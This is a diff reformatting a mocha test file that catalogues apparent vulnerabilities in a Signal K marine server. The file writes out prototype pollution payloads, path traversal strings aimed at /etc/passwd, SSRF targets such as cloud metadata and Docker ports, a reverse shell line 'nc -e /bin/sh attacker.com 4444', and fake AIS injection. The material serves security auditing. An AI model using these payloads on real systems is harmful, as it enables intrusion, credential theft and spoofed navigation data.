@@ -5,17 +5,16 @@
  * Each has specific file:line references and is verifiable.
  */
 
-const { describe, it } = require('mocha');
-const { expect } = require('chai');
+const { describe, it } = require('mocha')
+const { expect } = require('chai')
 
-describe('Additional Real Vulnerabilities - Code Verified', function() {
-  this.timeout(30000);
+describe('Additional Real Vulnerabilities - Code Verified', function () {
+  this.timeout(30000)
 
   // ==================== JSON-PATCH PROTOTYPE POLLUTION ====================
 
-  describe('json-patch Library Prototype Pollution (CVE)', function() {
-
-    it('CRITICAL: json-patch@0.7.0 has known prototype pollution vulnerability', function() {
+  describe('json-patch Library Prototype Pollution (CVE)', function () {
+    it('CRITICAL: json-patch@0.7.0 has known prototype pollution vulnerability', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/interfaces/applicationData.js line 22, 159
@@ -40,12 +39,12 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
           { op: 'add', path: '/constructor/prototype/isAdmin', value: true }
         ],
         impact: 'Prototype pollution affecting all objects in the application'
-      };
+      }
 
-      expect(vulnerability.version).to.equal('0.7.0');
-    });
+      expect(vulnerability.version).to.equal('0.7.0')
+    })
 
-    it('CRITICAL: jsonpatch.apply with user-controlled operations', function() {
+    it('CRITICAL: jsonpatch.apply with user-controlled operations', function () {
       /**
        * File: src/interfaces/applicationData.js lines 158-159
        *
@@ -57,21 +56,18 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
       const attack = {
         endpoint: 'POST /signalk/v1/applicationData/global/test/1.0.0',
         contentType: 'application/json',
-        body: [
-          { op: 'add', path: '/__proto__/pwned', value: true }
-        ],
+        body: [{ op: 'add', path: '/__proto__/pwned', value: true }],
         verification: 'After request: {}.pwned === true'
-      };
+      }
 
-      expect(attack.body[0].path).to.include('__proto__');
-    });
-  });
+      expect(attack.body[0].path).to.include('__proto__')
+    })
+  })
 
   // ==================== LOGFILE PATH BYPASS ====================
 
-  describe('Logfile Path Traversal Bypass', function() {
-
-    it('HIGH: Incomplete path sanitization in logfiles endpoint', function() {
+  describe('Logfile Path Traversal Bypass', function () {
+    it('HIGH: Incomplete path sanitization in logfiles endpoint', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/interfaces/logfiles.js lines 45-49
@@ -87,19 +83,19 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
        * But doesn't handle URL encoding or double encoding
        */
       const bypasses = [
-        '%2e%2e%2f',           // URL encoded ../
-        '%2e%2e/',             // Partial encoding
-        '..%2f',               // Partial encoding
-        '%252e%252e%252f',     // Double URL encoding
-        '....//....//etc/passwd',  // Extra dots bypass
+        '%2e%2e%2f', // URL encoded ../
+        '%2e%2e/', // Partial encoding
+        '..%2f', // Partial encoding
+        '%252e%252e%252f', // Double URL encoding
+        '....//....//etc/passwd', // Extra dots bypass
         'valid.log/../../etc/passwd', // After valid file
-        '..;/etc/passwd',      // Semicolon bypass
-      ];
+        '..;/etc/passwd' // Semicolon bypass
+      ]
 
-      expect(bypasses.length).to.be.above(0);
-    });
+      expect(bypasses.length).to.be.above(0)
+    })
 
-    it('HIGH: path.join does not prevent all traversals', function() {
+    it('HIGH: path.join does not prevent all traversals', function () {
       /**
        * path.join('/logs', '../../../etc/passwd') = '/etc/passwd'
        * The second .replace(/\.\./g, '') runs on the JOINED path
@@ -109,21 +105,20 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         input: '....//....//etc/passwd',
         afterReplaceAll: '....//....//etc/passwd', // regex doesn't match ....//
         afterJoin: '/var/log/signalk/....//....//etc/passwd',
-        afterFinalReplace: '/var/log/signalk/....//....//etc/passwd', // still passes!
-      };
+        afterFinalReplace: '/var/log/signalk/....//....//etc/passwd' // still passes!
+      }
 
       // Actually test path behavior
-      const path = require('path');
-      const test1 = path.join('/logs', '..', '..', 'etc', 'passwd');
-      expect(test1).to.equal('/etc/passwd');
-    });
-  });
+      const path = require('path')
+      const test1 = path.join('/logs', '..', '..', 'etc', 'passwd')
+      expect(test1).to.equal('/etc/passwd')
+    })
+  })
 
   // ==================== LODASH _.SET PROTOTYPE POLLUTION ====================
 
-  describe('_.set() Prototype Pollution via URL Path', function() {
-
-    it('CRITICAL: applicationData _.set with user path', function() {
+  describe('_.set() Prototype Pollution via URL Path', function () {
+    it('CRITICAL: applicationData _.set with user path', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/interfaces/applicationData.js line 157
@@ -145,12 +140,12 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         ],
         body: { value: true },
         impact: 'Prototype pollution via lodash _.set()'
-      };
+      }
 
-      expect(vulnerability.urls[0]).to.include('__proto__');
-    });
+      expect(vulnerability.urls[0]).to.include('__proto__')
+    })
 
-    it('CRITICAL: _.set in put.js for Signal K paths', function() {
+    it('CRITICAL: _.set in put.js for Signal K paths', function () {
       /**
        * File: src/put.js line 137 (referenced in report)
        *
@@ -162,17 +157,16 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         endpoint: 'PUT /signalk/v1/api/vessels/self/__proto__/polluted',
         body: { value: true },
         risk: 'Prototype pollution via PUT API'
-      };
+      }
 
-      expect(putPollution.endpoint).to.include('__proto__');
-    });
-  });
+      expect(putPollution.endpoint).to.include('__proto__')
+    })
+  })
 
   // ==================== PROVIDER SSRF VIA ANY HOST/PORT ====================
 
-  describe('Provider Configuration SSRF', function() {
-
-    it('CRITICAL: Provider API allows connection to any host:port', function() {
+  describe('Provider Configuration SSRF', function () {
+    it('CRITICAL: Provider API allows connection to any host:port', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/interfaces/providers.js lines 71-77, 197
@@ -189,35 +183,35 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
       const ssrfPayloads = [
         {
           type: 'tcp',
-          options: { host: '127.0.0.1', port: 6379 },  // Redis
+          options: { host: '127.0.0.1', port: 6379 }, // Redis
           risk: 'Redis command injection'
         },
         {
           type: 'tcp',
-          options: { host: '169.254.169.254', port: 80 },  // AWS metadata
+          options: { host: '169.254.169.254', port: 80 }, // AWS metadata
           risk: 'Cloud credential theft'
         },
         {
           type: 'tcp',
-          options: { host: '127.0.0.1', port: 2375 },  // Docker API
+          options: { host: '127.0.0.1', port: 2375 }, // Docker API
           risk: 'Container escape via Docker API'
         },
         {
           type: 'tcp',
-          options: { host: '127.0.0.1', port: 10250 },  // Kubelet
+          options: { host: '127.0.0.1', port: 10250 }, // Kubelet
           risk: 'Kubernetes node compromise'
         },
         {
           type: 'tcp',
-          options: { host: '127.0.0.1', port: 22 },  // SSH
+          options: { host: '127.0.0.1', port: 22 }, // SSH
           risk: 'SSH banner grabbing, potential exploitation'
         }
-      ];
+      ]
 
-      expect(ssrfPayloads.length).to.be.above(0);
-    });
+      expect(ssrfPayloads.length).to.be.above(0)
+    })
 
-    it('HIGH: No validation on provider ID allows special characters', function() {
+    it('HIGH: No validation on provider ID allows special characters', function () {
       /**
        * File: src/interfaces/providers.js lines 120-123
        *
@@ -235,19 +229,18 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         'provider\x00hidden',
         'provider|id',
         '<script>alert(1)</script>'
-      ];
+      ]
 
-      maliciousIds.forEach(id => {
-        expect(id.length).to.be.above(0);
-      });
-    });
-  });
+      maliciousIds.forEach((id) => {
+        expect(id.length).to.be.above(0)
+      })
+    })
+  })
 
   // ==================== ENABLE SECURITY ENDPOINT ====================
 
-  describe('Enable Security Endpoint Vulnerabilities', function() {
-
-    it('CRITICAL: enableSecurity endpoint accessible when no users exist', function() {
+  describe('Enable Security Endpoint Vulnerabilities', function () {
+    it('CRITICAL: enableSecurity endpoint accessible when no users exist', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/serverroutes.ts lines 542-577
@@ -263,12 +256,12 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         endpoint: 'POST /skServer/enableSecurity',
         body: { userId: 'attacker', password: 'password123' },
         impact: 'First user becomes admin - race condition during setup'
-      };
+      }
 
-      expect(vulnerability.impact).to.include('admin');
-    });
+      expect(vulnerability.impact).to.include('admin')
+    })
 
-    it('HIGH: require() with dynamic path in enableSecurity', function() {
+    it('HIGH: require() with dynamic path in enableSecurity', function () {
       /**
        * File: src/serverroutes.ts lines 565-566
        *
@@ -283,17 +276,16 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         variable: 'defaultSecurityStrategy',
         source: 'From application constants/config',
         risk: 'If defaultSecurityStrategy path is controllable, RCE'
-      };
+      }
 
-      expect(dynamicRequire.risk).to.include('RCE');
-    });
-  });
+      expect(dynamicRequire.risk).to.include('RCE')
+    })
+  })
 
   // ==================== VESSEL DATA INJECTION ====================
 
-  describe('Vessel Data Injection', function() {
-
-    it('HIGH: MMSI injection via vessel settings', function() {
+  describe('Vessel Data Injection', function () {
+    it('HIGH: MMSI injection via vessel settings', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/serverroutes.ts lines 728-757
@@ -306,16 +298,16 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
       const mmsiInjection = {
         endpoint: 'PUT /skServer/vessel',
         body: {
-          mmsi: '999999999',  // Fake MMSI
+          mmsi: '999999999', // Fake MMSI
           name: 'Fake Vessel'
         },
         impact: 'Impersonate other vessels on AIS'
-      };
+      }
 
-      expect(mmsiInjection.body.mmsi).to.equal('999999999');
-    });
+      expect(mmsiInjection.body.mmsi).to.equal('999999999')
+    })
 
-    it('HIGH: UUID injection when no MMSI', function() {
+    it('HIGH: UUID injection when no MMSI', function () {
       /**
        * File: src/serverroutes.ts lines 749-753
        *
@@ -332,17 +324,16 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
           name: 'Injected'
         },
         risk: 'Invalid UUID format accepted'
-      };
+      }
 
-      expect(uuidInjection.body.uuid).to.include('../');
-    });
-  });
+      expect(uuidInjection.body.uuid).to.include('../')
+    })
+  })
 
   // ==================== DISCOVERED PROVIDERS IDOR ====================
 
-  describe('Discovered Providers IDOR', function() {
-
-    it('HIGH: originalId allows accessing other discovery results', function() {
+  describe('Discovered Providers IDOR', function () {
+    it('HIGH: originalId allows accessing other discovery results', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/interfaces/providers.js lines 125-134
@@ -361,19 +352,18 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         location: 'src/interfaces/providers.js:127',
         field: 'provider.originalId',
         source: 'req.body',
-        attack: 'Set originalId to another user\'s discovered provider ID',
-        impact: 'Remove/claim other users\' discovered providers'
-      };
+        attack: "Set originalId to another user's discovered provider ID",
+        impact: "Remove/claim other users' discovered providers"
+      }
 
-      expect(idor.field).to.equal('provider.originalId');
-    });
-  });
+      expect(idor.field).to.equal('provider.originalId')
+    })
+  })
 
   // ==================== APPID/VERSION VALIDATION BYPASS ====================
 
-  describe('ApplicationData Validation Bypass', function() {
-
-    it('MEDIUM: validateAppId allows dangerous characters', function() {
+  describe('ApplicationData Validation Bypass', function () {
+    it('MEDIUM: validateAppId allows dangerous characters', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/interfaces/applicationData.js lines 193-194
@@ -386,21 +376,21 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
        * Allows: backslash, dots, null bytes, etc.
        */
       const bypassedIds = [
-        '..\\..\\..\\etc\\passwd',  // Windows path traversal
-        '__proto__',                 // Prototype pollution
-        'constructor',               // Prototype chain
-        'test\x00hidden',           // Null byte injection
-        '..',                        // Parent directory
-        '.',                         // Current directory
-      ];
+        '..\\..\\..\\etc\\passwd', // Windows path traversal
+        '__proto__', // Prototype pollution
+        'constructor', // Prototype chain
+        'test\x00hidden', // Null byte injection
+        '..', // Parent directory
+        '.' // Current directory
+      ]
 
-      bypassedIds.forEach(id => {
-        const isValid = id.length < 30 && id.indexOf('/') === -1;
-        expect(isValid).to.be.true;  // All these pass validation!
-      });
-    });
+      bypassedIds.forEach((id) => {
+        const isValid = id.length < 30 && id.indexOf('/') === -1
+        expect(isValid).to.be.true // All these pass validation!
+      })
+    })
 
-    it('MEDIUM: semver.coerce is too lenient', function() {
+    it('MEDIUM: semver.coerce is too lenient', function () {
       /**
        * File: src/interfaces/applicationData.js lines 197-198
        *
@@ -415,21 +405,20 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         { input: 'malicious123', expected: '123.0.0' },
         { input: '../../etc/passwd1', expected: '1.0.0' },
         { input: '__proto__1', expected: '1.0.0' }
-      ];
+      ]
 
-      const semver = require('semver');
-      coercedVersions.forEach(v => {
-        const coerced = semver.coerce(v.input);
-        expect(coerced).to.not.be.null;
-      });
-    });
-  });
+      const semver = require('semver')
+      coercedVersions.forEach((v) => {
+        const coerced = semver.coerce(v.input)
+        expect(coerced).to.not.be.null
+      })
+    })
+  })
 
   // ==================== DEBUG ENDPOINT INFO DISCLOSURE ====================
 
-  describe('Debug Endpoint Information Disclosure', function() {
-
-    it('MEDIUM: Debug enable/disable exposes internal state', function() {
+  describe('Debug Endpoint Information Disclosure', function () {
+    it('MEDIUM: Debug enable/disable exposes internal state', function () {
       /**
        * File: src/serverroutes.ts lines 931-945
        *
@@ -448,17 +437,16 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
           'Configuration values',
           'User session data'
         ]
-      };
+      }
 
-      expect(debugLeak.leakedInfo.length).to.be.above(0);
-    });
-  });
+      expect(debugLeak.leakedInfo.length).to.be.above(0)
+    })
+  })
 
   // ==================== BUSBOY FILE UPLOAD ====================
 
-  describe('File Upload Vulnerabilities', function() {
-
-    it('HIGH: Backup upload via busboy without size limits', function() {
+  describe('File Upload Vulnerabilities', function () {
+    it('HIGH: Backup upload via busboy without size limits', function () {
       /**
        * File: src/serverroutes.ts lines 1075-1147
        *
@@ -474,17 +462,16 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         issue: 'No file size limit in busboy configuration',
         attack: 'Upload 100GB file to exhaust disk',
         impact: 'Denial of Service via disk exhaustion'
-      };
+      }
 
-      expect(uploadVuln.issue).to.include('No file size limit');
-    });
-  });
+      expect(uploadVuln.issue).to.include('No file size limit')
+    })
+  })
 
   // ==================== COMMAND INJECTION VIA ENV ====================
 
-  describe('Command Injection via Environment Variables', function() {
-
-    it('CRITICAL: MFD_ADDRESS_SCRIPT environment variable executed directly', function() {
+  describe('Command Injection via Environment Variables', function () {
+    it('CRITICAL: MFD_ADDRESS_SCRIPT environment variable executed directly', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/interfaces/mfd_webapp.ts lines 82-85
@@ -516,17 +503,16 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
           'nc -e /bin/sh attacker.com 4444'
         ],
         impact: 'Remote Code Execution if environment is compromised'
-      };
+      }
 
-      expect(vulnerability.code).to.include('execP');
-    });
-  });
+      expect(vulnerability.code).to.include('execP')
+    })
+  })
 
   // ==================== NPM PACKAGE NAME INJECTION ====================
 
-  describe('NPM Command Injection', function() {
-
-    it('HIGH: Package name/version passed unsanitized to spawn', function() {
+  describe('NPM Command Injection', function () {
+    it('HIGH: Package name/version passed unsanitized to spawn', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/modules.ts lines 183-204
@@ -553,12 +539,12 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         windowsSpecific: 'cmd /c allows more injection vectors',
         linuxSpecific: 'sudo npm runs as root!',
         impact: 'Remote Code Execution as root (Linux) or user (Windows)'
-      };
+      }
 
-      expect(vulnerability.linuxSpecific).to.include('root');
-    });
+      expect(vulnerability.linuxSpecific).to.include('root')
+    })
 
-    it('HIGH: spawn with sudo gives root privileges', function() {
+    it('HIGH: spawn with sudo gives root privileges', function () {
       /**
        * File: src/modules.ts line 195
        *
@@ -572,17 +558,16 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         code: "spawn('sudo', ['npm', ...])",
         risk: 'Malicious npm package postinstall runs as root',
         impact: 'Full system compromise via malicious plugin'
-      };
+      }
 
-      expect(sudoRisk.code).to.include('sudo');
-    });
-  });
+      expect(sudoRisk.code).to.include('sudo')
+    })
+  })
 
   // ==================== OPEN REDIRECT ====================
 
-  describe('Open Redirect After Login', function() {
-
-    it('HIGH: Login redirect to user-controlled destination', function() {
+  describe('Open Redirect After Login', function () {
+    it('HIGH: Login redirect to user-controlled destination', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/tokensecurity.js line 214
@@ -603,17 +588,16 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         },
         flow: '1. Victim clicks link to /login?destination=evil.com, 2. Enters creds, 3. Redirected to phishing site',
         impact: 'Credential phishing via trusted redirect'
-      };
+      }
 
-      expect(vulnerability.payload.destination).to.include('attacker.com');
-    });
-  });
+      expect(vulnerability.payload.destination).to.include('attacker.com')
+    })
+  })
 
   // ==================== ZIP SLIP ====================
 
-  describe('Zip Slip Path Traversal', function() {
-
-    it('CRITICAL: unzipper.Extract without path validation', function() {
+  describe('Zip Slip Path Traversal', function () {
+    it('CRITICAL: unzipper.Extract without path validation', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/serverroutes.ts lines 1101-1114
@@ -638,12 +622,12 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         },
         verification: 'Create zip with relative paths outside extraction dir',
         impact: 'Arbitrary file write anywhere on filesystem'
-      };
+      }
 
-      expect(vulnerability.payload.zipEntry).to.include('../');
-    });
+      expect(vulnerability.payload.zipEntry).to.include('../')
+    })
 
-    it('HIGH: No content-type validation on uploaded files', function() {
+    it('HIGH: No content-type validation on uploaded files', function () {
       /**
        * File: src/serverroutes.ts lines 1080-1095
        *
@@ -658,19 +642,22 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
       const validation = {
         location: 'src/serverroutes.ts:1080-1095',
         checks: ['filename exists', 'starts with signalk-'],
-        missing: ['mimetype validation', 'magic bytes check', 'zip structure validation'],
+        missing: [
+          'mimetype validation',
+          'magic bytes check',
+          'zip structure validation'
+        ],
         attack: 'Upload polyglot file (valid zip + malicious content)'
-      };
+      }
 
-      expect(validation.missing).to.include('mimetype validation');
-    });
-  });
+      expect(validation.missing).to.include('mimetype validation')
+    })
+  })
 
   // ==================== WILDCARD CORS ====================
 
-  describe('CORS Misconfiguration', function() {
-
-    it('MEDIUM: Wildcard CORS with credentials', function() {
+  describe('CORS Misconfiguration', function () {
+    it('MEDIUM: Wildcard CORS with credentials', function () {
       /**
        * VERIFIED FINDING
        * File: src/cors.ts lines 26-28
@@ -690,17 +677,16 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         credentialsEnabled: true,
         impact: 'Cross-site request forgery with credentials on any origin',
         attack: 'Attacker site can make authenticated requests to Signal K'
-      };
+      }
 
-      expect(corsMisconfig.credentialsEnabled).to.be.true;
-    });
-  });
+      expect(corsMisconfig.credentialsEnabled).to.be.true
+    })
+  })
 
   // ==================== JWT ALGORITHM CONFUSION ====================
 
-  describe('JWT Algorithm Confusion', function() {
-
-    it('CRITICAL: jwt.verify without algorithm specification', function() {
+  describe('JWT Algorithm Confusion', function () {
+    it('CRITICAL: jwt.verify without algorithm specification', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/tokensecurity.js line 730
@@ -725,17 +711,16 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
           'Algorithm downgrade attacks'
         ],
         impact: 'Authentication bypass via forged JWT'
-      };
+      }
 
-      expect(vulnerability.missing).to.include('algorithms');
-    });
-  });
+      expect(vulnerability.missing).to.include('algorithms')
+    })
+  })
 
   // ==================== UDP DISCOVERY SSRF ====================
 
-  describe('UDP Discovery SSRF', function() {
-
-    it('CRITICAL: GoFree discovery trusts UDP broadcast data', function() {
+  describe('UDP Discovery SSRF', function () {
+    it('CRITICAL: GoFree discovery trusts UDP broadcast data', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/discovery.js lines 87-117
@@ -770,17 +755,16 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
           'Set IP to localhost:2375 for Docker API'
         ],
         impact: 'SSRF via discovered providers, credential theft'
-      };
+      }
 
-      expect(vulnerability.userControlled).to.include('json.IP');
-    });
-  });
+      expect(vulnerability.userControlled).to.include('json.IP')
+    })
+  })
 
   // ==================== NMEA TCP INJECTION ====================
 
-  describe('NMEA TCP Unauthenticated Injection', function() {
-
-    it('CRITICAL: TCP port 10110 accepts data without authentication', function() {
+  describe('NMEA TCP Unauthenticated Injection', function () {
+    it('CRITICAL: TCP port 10110 accepts data without authentication', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/interfaces/nmea-tcp.js lines 33-40
@@ -808,17 +792,16 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
           '$AIVDM - Inject fake AIS targets'
         ],
         impact: 'Unauthenticated injection of navigation data'
-      };
+      }
 
-      expect(vulnerability.authRequired).to.be.false;
-    });
-  });
+      expect(vulnerability.authRequired).to.be.false
+    })
+  })
 
   // ==================== RESOURCE TYPE PROTOTYPE POLLUTION ====================
 
-  describe('Resource Type Prototype Pollution', function() {
-
-    it('HIGH: resourceType used as object property accessor', function() {
+  describe('Resource Type Prototype Pollution', function () {
+    it('HIGH: resourceType used as object property accessor', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/api/resources/index.ts lines 479, 525
@@ -840,17 +823,16 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
           '/signalk/v2/api/resources/prototype/_providers/_default/evil'
         ],
         impact: 'Prototype pollution via resource type'
-      };
+      }
 
-      expect(vulnerability.payloads[0]).to.include('__proto__');
-    });
-  });
+      expect(vulnerability.payloads[0]).to.include('__proto__')
+    })
+  })
 
   // ==================== BCRYPT SALT ROUNDS ====================
 
-  describe('Bcrypt Configuration', function() {
-
-    it('MEDIUM: Salt rounds of 10 is on the low end', function() {
+  describe('Bcrypt Configuration', function () {
+    it('MEDIUM: Salt rounds of 10 is on the low end', function () {
       /**
        * VERIFIED FINDING
        * File: src/tokensecurity.js line 33
@@ -872,17 +854,16 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
           rounds12: '~2,500 hashes/second on GPU'
         },
         impact: 'Faster password cracking if hash database is stolen'
-      };
+      }
 
-      expect(finding.currentRounds).to.equal(10);
-    });
-  });
+      expect(finding.currentRounds).to.equal(10)
+    })
+  })
 
   // ==================== ERROR MESSAGE INFORMATION DISCLOSURE ====================
 
-  describe('Error Message Information Disclosure', function() {
-
-    it('MEDIUM: err.message sent directly to client', function() {
+  describe('Error Message Information Disclosure', function () {
+    it('MEDIUM: err.message sent directly to client', function () {
       /**
        * VERIFIED VULNERABILITY
        * Multiple locations expose internal error messages:
@@ -919,12 +900,12 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
           'JSON parse errors revealing data structure'
         ],
         impact: 'Information disclosure aiding further attacks'
-      };
+      }
 
-      expect(vulnerability.locations.length).to.be.above(5);
-    });
+      expect(vulnerability.locations.length).to.be.above(5)
+    })
 
-    it('MEDIUM: Stack traces logged to console in production', function() {
+    it('MEDIUM: Stack traces logged to console in production', function () {
       /**
        * File: src/serverroutes.ts line 481
        *
@@ -936,17 +917,16 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         location: 'src/serverroutes.ts:481',
         code: 'console.log(err.stack)',
         risk: 'Stack traces reveal code structure and dependencies'
-      };
+      }
 
-      expect(vulnerability.code).to.include('stack');
-    });
-  });
+      expect(vulnerability.code).to.include('stack')
+    })
+  })
 
   // ==================== FOR...IN PROTOTYPE POLLUTION ====================
 
-  describe('For...in Loop Prototype Pollution', function() {
-
-    it('MEDIUM: for...in loops may iterate polluted properties', function() {
+  describe('For...in Loop Prototype Pollution', function () {
+    it('MEDIUM: for...in loops may iterate polluted properties', function () {
       /**
        * VERIFIED FINDING
        * Multiple locations use for...in without hasOwnProperty check:
@@ -971,22 +951,25 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
           { file: 'src/put.js', line: 97, object: 'metaValue' },
           { file: 'src/interfaces/rest.js', line: 75, object: 'aPath' },
           { file: 'src/mdns.js', line: 64, object: 'app.interfaces' },
-          { file: 'src/api/resources/index.ts', line: 124, object: 'this.resProvider' }
+          {
+            file: 'src/api/resources/index.ts',
+            line: 124,
+            object: 'this.resProvider'
+          }
         ],
         correctPattern: 'if (obj.hasOwnProperty(key)) { ... }',
         attack: 'Pollute Object.prototype, then trigger for...in loop',
         impact: 'Unexpected code execution on polluted properties'
-      };
+      }
 
-      expect(vulnerability.locations.length).to.be.above(3);
-    });
-  });
+      expect(vulnerability.locations.length).to.be.above(3)
+    })
+  })
 
   // ==================== ReDoS (Regular Expression DoS) ====================
 
-  describe('ReDoS - Regular Expression Denial of Service', function() {
-
-    it('CRITICAL: User input passed directly to new RegExp()', function() {
+  describe('ReDoS - Regular Expression Denial of Service', function () {
+    it('CRITICAL: User input passed directly to new RegExp()', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/subscriptionmanager.ts lines 225-228, 240-243
@@ -1011,18 +994,18 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         userInput: ['path', 'context'],
         source: 'WebSocket subscribe message',
         payloads: [
-          '(a+)+$',           // Classic ReDoS
-          '([a-zA-Z]+)*$',    // Exponential backtracking
-          '(a|aa)+$',         // Alternation explosion
-          '(.*a){20}$'        // Quantifier stacking
+          '(a+)+$', // Classic ReDoS
+          '([a-zA-Z]+)*$', // Exponential backtracking
+          '(a|aa)+$', // Alternation explosion
+          '(.*a){20}$' // Quantifier stacking
         ],
         impact: 'Server CPU exhaustion, denial of service'
-      };
+      }
 
-      expect(vulnerability.locations.length).to.equal(2);
-    });
+      expect(vulnerability.locations.length).to.equal(2)
+    })
 
-    it('HIGH: ACL checking uses unvalidated regex patterns', function() {
+    it('HIGH: ACL checking uses unvalidated regex patterns', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/tokensecurity.js lines 784-786, 795-797, 801-803
@@ -1044,17 +1027,16 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         ],
         userInput: 'ACL configuration (admin)',
         impact: 'ReDoS via malicious ACL patterns'
-      };
+      }
 
-      expect(vulnerability.locations.length).to.equal(3);
-    });
-  });
+      expect(vulnerability.locations.length).to.equal(3)
+    })
+  })
 
   // ==================== DYNAMIC REQUIRE ====================
 
-  describe('Dynamic Require - Arbitrary Module Loading', function() {
-
-    it('CRITICAL: require() with user-controlled module path', function() {
+  describe('Dynamic Require - Arbitrary Module Loading', function () {
+    it('CRITICAL: require() with user-controlled module path', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/pipedproviders.ts line 147
@@ -1076,17 +1058,17 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         source: 'elementConfig.type from settings',
         attacks: [
           '../../../tmp/attacker-module',
-          '/etc/passwd',  // Will fail but leaks path info
-          'child_process',  // Load built-in modules
+          '/etc/passwd', // Will fail but leaks path info
+          'child_process', // Load built-in modules
           './evil-local-module'
         ],
         impact: 'Arbitrary code execution via module loading'
-      };
+      }
 
-      expect(vulnerability.code).to.include('require');
-    });
+      expect(vulnerability.code).to.include('require')
+    })
 
-    it('HIGH: Multiple dynamic require patterns in codebase', function() {
+    it('HIGH: Multiple dynamic require patterns in codebase', function () {
       /**
        * VERIFIED PATTERNS
        * File: src/serverroutes.ts line 566
@@ -1105,24 +1087,31 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
        */
       const vulnerability = {
         locations: [
-          { file: 'src/serverroutes.ts', line: 566, variable: 'defaultSecurityStrategy' },
-          { file: 'src/security.ts', line: 227, variable: 'securityStrategyModuleName' },
+          {
+            file: 'src/serverroutes.ts',
+            line: 566,
+            variable: 'defaultSecurityStrategy'
+          },
+          {
+            file: 'src/security.ts',
+            line: 227,
+            variable: 'securityStrategyModuleName'
+          },
           { file: 'src/modules.ts', line: 349, variable: 'moduleDir' },
           { file: 'src/config/config.ts', line: 411, variable: 'settings' }
         ],
         risk: 'Configuration-controlled paths passed to require()',
         impact: 'Code execution if attacker controls config'
-      };
+      }
 
-      expect(vulnerability.locations.length).to.equal(4);
-    });
-  });
+      expect(vulnerability.locations.length).to.equal(4)
+    })
+  })
 
   // ==================== COOKIE SECURITY ====================
 
-  describe('Cookie Security Issues', function() {
-
-    it('MEDIUM: Authentication cookie missing secure flag', function() {
+  describe('Cookie Security Issues', function () {
+    it('MEDIUM: Authentication cookie missing secure flag', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/tokensecurity.js lines 196-204
@@ -1143,12 +1132,12 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         hasSecure: false,
         hasSameSite: false,
         impact: 'Cookie sent over unencrypted HTTP, CSRF possible'
-      };
+      }
 
-      expect(vulnerability.hasSecure).to.be.false;
-    });
+      expect(vulnerability.hasSecure).to.be.false
+    })
 
-    it('MEDIUM: Login info cookie has no security attributes', function() {
+    it('MEDIUM: Login info cookie has no security attributes', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/tokensecurity.js lines 206-209
@@ -1168,17 +1157,16 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         hasSecure: false,
         hasSameSite: false,
         impact: 'Cookie accessible via JavaScript, sent over HTTP'
-      };
+      }
 
-      expect(vulnerability.hasHttpOnly).to.be.false;
-    });
-  });
+      expect(vulnerability.hasHttpOnly).to.be.false
+    })
+  })
 
   // ==================== JWT PAYLOAD LEAK ====================
 
-  describe('JWT Payload Leak in Error Messages', function() {
-
-    it('MEDIUM: JWT payload serialized in error message', function() {
+  describe('JWT Payload Leak in Error Messages', function () {
+    it('MEDIUM: JWT payload serialized in error message', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/tokensecurity.js lines 764-766
@@ -1196,17 +1184,16 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         code: 'JSON.stringify(payload)',
         leaks: ['user id', 'permissions', 'device info', 'any custom claims'],
         impact: 'JWT payload leak in error responses/logs'
